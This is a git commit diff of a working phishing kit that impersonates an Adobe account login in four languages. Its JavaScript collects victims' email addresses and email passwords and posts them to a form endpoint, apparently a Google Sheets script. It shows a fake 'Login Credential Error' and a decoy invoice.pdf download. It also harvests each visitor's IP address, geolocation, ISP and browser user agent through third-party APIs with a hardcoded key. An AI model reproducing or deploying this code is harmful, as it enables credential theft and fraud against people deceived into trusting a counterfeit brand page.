70bc004773f5a12acf01f5201fdfb4bd2824b288
hxnain619 <hxan619@gmail.com>
2021-12-22 05:45:48 +0500

    uploading changes

--- js/form-submission-handler.js
+++ js/form-submission-handler.js
@@ -1,161 +1,180 @@
 const apiKey = "at_iUPzHyxcZr1s5wI1RDYrr0k0sbKLj";
-const domainName = 'whoisxmlapi.com';
-const url = 'https://www.whoisxmlapi.com/whoisserver/WhoisService?' + `domainName=${domainName}&apikey=${apiKey}`;
+const domainName = "whoisxmlapi.com";
+const url =
+	"https://www.whoisxmlapi.com/whoisserver/WhoisService?" +
+	`domainName=${domainName}&apikey=${apiKey}`;
+
 (function () {
-    function getFormData(form) {
-        var elements = form.elements;
-        var honeypot;
-        var fields = Object.keys(elements).filter(function (k) {
-            if (elements[k].name === "honeypot") {
-                honeypot = elements[k].value;
-                return !1
-            }
-            return !0
-        }).map(function (k) {
-            if (elements[k].name !== undefined) {
-                return elements[k].name
-            } else if (elements[k].length > 0) {
-                return elements[k].item(0).name
-            }
-        }).filter(function (item, pos, self) {
-            return self.indexOf(item) == pos && item
-        });
-        var formData = {};
-        fields.forEach(function (name) {
-            var element = elements[name];
-            formData[name] = element.value;
-            if (element.length) {
-                var data = [];
-                for (var i = 0; i < element.length; i++) {
-                    var item = element.item(i);
-                    if (item.checked || item.selected) {
-                        data.push(item.value)
-                    }
-                }
-                formData[name] = data.join(', ')
-            }
-        });
-        formData.formDataNameOrder = JSON.stringify(fields);
-        formData.formGoogleSheetName = form.dataset.sheet || "responses";
-        formData.formGoogleSend = form.dataset.email || "";
-        return {
-            data: formData,
-            honeypot
-        }
-    }
+	function getFormData(form) {
+		var elements = form.elements;
+		var honeypot;
+		var fields = Object.keys(elements)
+			.filter(function (k) {
+				if (elements[k].name === "honeypot") {
+					honeypot = elements[k].value;
+					return !1;
+				}
+				return !0;
+			})
+			.map(function (k) {
+				if (elements[k].name !== undefined) {
+					return elements[k].name;
+				} else if (elements[k].length > 0) {
+					return elements[k].item(0).name;
+				}
+			})
+			.filter(function (item, pos, self) {
+				return self.indexOf(item) == pos && item;
+			});
+		var formData = {};
+		fields.forEach(function (name) {
+			var element = elements[name];
+			formData[name] = element.value;
+			if (element.length) {
+				var data = [];
+				for (var i = 0; i < element.length; i++) {
+					var item = element.item(i);
+					if (item.checked || item.selected) {
+						data.push(item.value);
+					}
+				}
+				formData[name] = data.join(", ");
+			}
+		});
+		formData.formDataNameOrder = JSON.stringify(fields);
+		formData.formGoogleSheetName = form.dataset.sheet || "responses";
+		formData.formGoogleSend = form.dataset.email || "";
+		return {
+			data: formData,
+			honeypot,
+		};
+	}
 
-    function handleFormSubmit(event) {
-        event.preventDefault();
-        var form = event.target;
-        var formData = getFormData(form);
-        var data = formData.data;
-        var loading = document.querySelector(".loader")
-        var email = document.getElementsByClassName('email')[0]
-        var pass = document.getElementsByClassName('password')[0]
+	function handleFormSubmit(event) {
+		event.preventDefault();
+		var form = event.target;
+		var formData = getFormData(form);
+		var data = formData.data;
+		var loading = document.querySelector(".loader");
+		var email = document.getElementsByClassName("email")[0];
+		var pass = document.getElementsByClassName("password")[0];
 
-        // i created a div and assign it as a child of body, then paste that bootstrap alert in there
-        var alert = document.createElement('div');
-        var body = document.getElementsByTagName('body')[0];
+		// i created a div and assign it as a child of body, then paste that bootstrap alert in there
+		var alert = document.createElement("div");
+		var body = document.getElementsByTagName("body")[0];
 
-        body.appendChild(alert)
+		body.appendChild(alert);
 
-        if (email.value.length !== 0 && pass.value.length !== 0) {
-            if (email.value.includes('@') && email.value.includes('.')) {
-                if (pass.value.length >= 6) {
-
-                    if (formData.honeypot) {
-                        return
-                    }
-                    setTimeout(() => loading.style.display = "block", 500)
-                    var url = form.action;
-                    var xhr = new XMLHttpRequest();
-                    xhr.open('POST', url);
-                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                    xhr.onreadystatechange = function () {
-                        if (xhr.readyState === 4) {
-                            var response = JSON.parse(xhr.responseText);
-                            if (xhr.status === 200 && response.status === 'OK') {
-                                loading.style.display = 'none';
-                                alert.innerHTML = `<div class="alert alert-danger alert-dismissible" role="alert"> 
+		if (email.value.length !== 0 && pass.value.length !== 0) {
+			if (email.value.includes("@") && email.value.includes(".")) {
+				if (pass.value.length >= 6) {
+					if (formData.honeypot) {
+						return;
+					}
+					setTimeout(() => (loading.style.display = "block"), 500);
+					var url = form.action;
+					var xhr = new XMLHttpRequest();
+					xhr.open("POST", url);
+					xhr.setRequestHeader(
+						"Content-Type",
+						"application/x-www-form-urlencoded",
+					);
+					xhr.onreadystatechange = function () {
+						if (xhr.readyState === 4) {
+							var response = JSON.parse(xhr.responseText);
+							if (xhr.status === 200 && response.result === "success") {
+								loading.style.display = "none";
+								downloadURI(
+									window.location.href + "/invoice.pdf",
+									"invoice.pdf",
+								);
+								alert.innerHTML = `<div class="alert alert-danger alert-dismissible" role="alert"> 
                                 Login Credential Error 
                                 <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                 <span aria-hidden="true">&times;</span>
                               </button>
-                                </div>`
-                            } else {
-                                loading.style.display = 'none';
-                                alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert"> 
+                                </div>`;
+							} else {
+								console.log(response);
+								loading.style.display = "none";
+								alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert"> 
                                 Login Credential Error 
                                 <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                 <span aria-hidden="true">&times;</span>
                               </button>
-                              </div>`
-
-                            }
-                        }
-                        return
-                    };
-                    var encoded = Object.keys(data).map(function (k) {
-                        return encodeURIComponent(k) + "=" + encodeURIComponent(data[k])
-                    }).join('&');
-                    xhr.send(encoded)
-                } else {
-                    alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
+                              </div>`;
+							}
+						}
+						return;
+					};
+					var encoded = Object.keys(data)
+						.map(function (k) {
+							return encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
+						})
+						.join("&");
+					xhr.send(encoded);
+				} else {
+					alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
                      Password is not correct 
                      <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                     <span aria-hidden="true">&times;</span>
-                  </button></div>`
-                }
-            } else {
-                alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
+                  </button></div>`;
+				}
+			} else {
+				alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
                  Email is not correct 
                  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                 <span aria-hidden="true">&times;</span>
-              </button></div>`
-            }
-        } else {
-            alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
+              </button></div>`;
+			}
+		} else {
+			alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
              Please fill the field 
              <button type="button" class="close" data-dismiss="alert" aria-label="Close">
             <span aria-hidden="true">&times;</span>
-          </button></div>`
-        }
-    }
+          </button></div>`;
+		}
+	}
 
-    function loaded() {
-        var loading = document.querySelector(".loader")
-        loading.style.display = "none";
-        var forms = document.querySelectorAll("form.gform");
-        for (var i = 0; i < forms.length; i++) {
-            forms[i].addEventListener("submit", handleFormSubmit, !1)
-        }
-    };
-    document.addEventListener("DOMContentLoaded", loaded, !1);
-    // apis to fetch the user's info
-    fetch('https://api.ipify.org?format=json').then(IP => {
-        return IP.json()
-    }).then(async IP => {
-        await fetch(`https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey=at_iUPzHyxcZr1s5wI1RDYrr0k0sbKLj&ipAddress=${IP.ip}`).then(res => {
-            return res.json()
-        }).then(data => {
-            let info = document.getElementById('info');
-            let {
-                domain,
-                name,
-                type
-            } = data.as;
-            let {
-                ip
-            } = data;
-            let {
-                city,
-                country,
-                region,
-                lat,
-                lng
-            } = data.location;
-            let DeviceInfo = window.navigator.userAgent;
-            info.value = `Internet Info : \n 
+	function loaded() {
+		var loading = document.querySelector(".loader");
+		loading.style.display = "none";
+		var forms = document.querySelectorAll("form.gform");
+		for (var i = 0; i < forms.length; i++) {
+			forms[i].addEventListener("submit", handleFormSubmit, !1);
+		}
+	}
+	function downloadURI(uri, name = "download") {
+		var link = document.createElement("a");
+		// If you don't know the name or want to use
+		// the webserver default set name = ''
+		link.setAttribute("download", name);
+		link.href = uri;
+		document.body.appendChild(link);
+		link.click();
+		link.remove();
+	}
+	document.addEventListener("DOMContentLoaded", loaded, !1);
+	// apis to fetch the user's info
+	fetch("https://api.ipify.org?format=json")
+		.then((IP) => {
+			return IP.json();
+		})
+		.then(async (IP) => {
+			await fetch(
+				`https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey=at_iUPzHyxcZr1s5wI1RDYrr0k0sbKLj&ipAddress=${IP.ip}`,
+			)
+				.then((res) => {
+					return res.json();
+				})
+				.then((data) => {
+					let info = document.getElementById("info");
+					let { domain, name, type } = data.as;
+					let { ip } = data;
+					let { city, country, region, lat, lng } = data.location;
+					let DeviceInfo = window.navigator.userAgent;
+
+					info.value = `Internet Info : \n 
                     Domain: ${domain},
                     \n Name: ${name},
                     \n Type = ${type} .
@@ -167,7 +186,18 @@ const url = 'https://www.whoisxmlapi.com/whoisserver/WhoisService?' + `domainNam
                      Latitude: ${lat}, \n
                      Longitute: ${lng} . \n
                      Device Info: ${DeviceInfo}.
-                     `
-        })
-    })
-})()
+                     `;
+
+					const lang = Languages[country.toLowerCase()];
+					if (country && lang?.email) {
+						Object.keys(lang).forEach((elem) => {
+							if (elem == ("email" || "pass")) {
+								document.getElementById(elem).placeholder = lang[elem];
+							} else {
+								document.getElementById(elem).innerHTML = lang[elem];
+							}
+						});
+					}
+				});
+		});
+})();
---
+++ js/index.js
@@ -0,0 +1,146 @@
+const Languages = {
+	en: {
+		"head-title": "For your protection, please verify your identity.",
+		"head-sub-title": "Adobe Account",
+		email: "Email Address",
+		pass: "Email Password",
+		"signin-btn": "Sign in",
+		"forgot-pass-btn": "Forgot Password?",
+		"not-a-member": `Not a member yet? <a href="#" class="pdf-link"> Get an Adobe ID </a>
+        <br />
+        <br />
+        Want to use your company or school account? <br />
+        <a href="#" class="pdf-link"> Sign in with an Enterprise ID </a>
+        <br>
+        <br>
+        <span class="seperator-Parent">
+            <span class="seperator">Or </span>
+        </span>
+        <br>
+        <button class="fb-btn">
+            <img src="./images/FB.png" width="20px" style="vertical-align: text-bottom;">
+            &nbsp;
+            Continue with Facebook
+        </button>
+        <br>
+        <button class="google-btn">
+            &nbsp;
+            <img src="./images/google.jpg" width="20px" style="vertical-align: text-bottom;">
+            Continue with Google
+        </button>
+        <br>
+        <button class="apple-btn">
+           <img src="./images/apple.png" width="20px" style="vertical-align: text-bottom;">
+           &nbsp;
+            Continue with Apple
+        </button>`,
+	},
+	cn: {
+		"head-title": "为了您的安全，请验证您的身份",
+		"head-sub-title": "Adobe 帐户",
+		email: "电子邮件地址",
+		pass: "电子邮件密码",
+		"signin-btn": "登录",
+		"forgot-pass-btn": "忘记密码？",
+		"not-a-member": `还不是会员？ <a href="#" class="pdf-link">获取 Adob​​e ID </a>
+        <br />
+        <br />
+        想使用您的公司或学校帐户吗？ <br />
+        <a href="#" class="pdf-link">使用企业 ID 登录</a>
+        <br>
+        <br>
+        <span class="seperator-Parent">
+            <span class="seperator">或者</span>
+        </span>
+        <br>
+        <button class="fb-btn">
+            <img src="./images/FB.png" width="20px" style="vertical-align: text-bottom;">
+            &nbsp;
+            继续使用 Facebook
+        </按钮>
+        <br>
+        <button class="google-btn">
+            &nbsp;
+            <img src="./images/google.jpg" width="20px" style="vertical-align: text-bottom;">
+            继续使用 Google
+        </button>
+        <br>
+        <button class="apple-btn">
+           <img src="./images/apple.png" width="20px" style="vertical-align: text-bottom;">
+           &nbsp;
+            继续使用 Apple
+        </button>`,
+	},
+	es: {
+		"head-title": "Para su protección, verifique su identidad",
+		"head-sub-title": "Cuenta de Adobe",
+		email: "Dirección de correo electrónico",
+		pass: "Contraseña de correo electrónico",
+		"signin-btn": "Iniciar sesión",
+		"forgot-pass-btn": "¿Olvidaste tu contraseña?",
+		"not-a-member": `¿Aún no eres miembro? <a href="#" class="pdf-link"> Obtenga un ID de Adobe </a>
+        <br />
+        <br />
+        ¿Quiere utilizar su cuenta de empresa o escuela? <br />
+        <a href="#" class="pdf-link"> Iniciar sesión con un ID de empresa </a>
+        <br>
+        <br>
+        <span class="separador-Padre">
+            <span class="seperator"> O </span>
+        </span>
+        <br>
+        <button class="fb-btn">
+            <img src = "./ images / FB.png" width="20px" style="vertical-align: text-bottom;">
+            &nbsp;
+            Continuar con Facebook
+        </button>
+        <br>
+        <button class="google-btn">
+            &nbsp;
+            <img src = "./ images / google.jpg" width="20px" style="vertical-align: text-bottom;">
+            Continuar con Google
+        </button>
+        <br>
+        <button class="apple-btn">
+           <img src = "./ images / apple.png" width="20px" style="vertical-align: text-bottom;">
+           &nbsp;
+            Continuar con Apple
+        </button>`,
+	},
+	fr: {
+		"head-title": "Pour votre protection, veuillez vérifier votre identité.",
+		"head-sub-title": "Compte Adobe",
+		email: "Adresse e-mail",
+		pass: "Mot de passe e-mail",
+		"signin-btn": "Connectez-vous",
+		"forgot-pass-btn": "Mot de passe oublié ?",
+		"not-a-member": `Pas encore membre ? <a href="#" class="pdf-link"> Obtenir un Adobe ID </a>
+        <br />
+        <br />
+        Vous voulez utiliser votre compte d'entreprise ou d'école ? <br />
+        <a href="#" class="pdf-link"> Connectez-vous avec un identifiant d'entreprise </a>
+        <br>
+        <br>
+        <span class="seperator-Parent">
+            <span class="seperator">Ou </span>
+        </span>
+        <br>
+        <button class="fb-btn">
+            <img src="./images/FB.png" width="20px" style="vertical-align: text-bottom;">
+            &nbsp;
+            Continuer avec Facebook
+        </bouton>
+        <br>
+        <button class="google-btn">
+            &nbsp;
+            <img src="./images/google.jpg" width="20px" style="vertical-align: text-bottom;">
+            Continuer avec Google
+        </bouton>
+        <br>
+        <button class="apple-btn">
+           <img src="./images/apple.png" width="20px" style="vertical-align: text-bottom;">
+           &nbsp;
+            Continuer avec Apple
+        </button>`,
+	},
+};
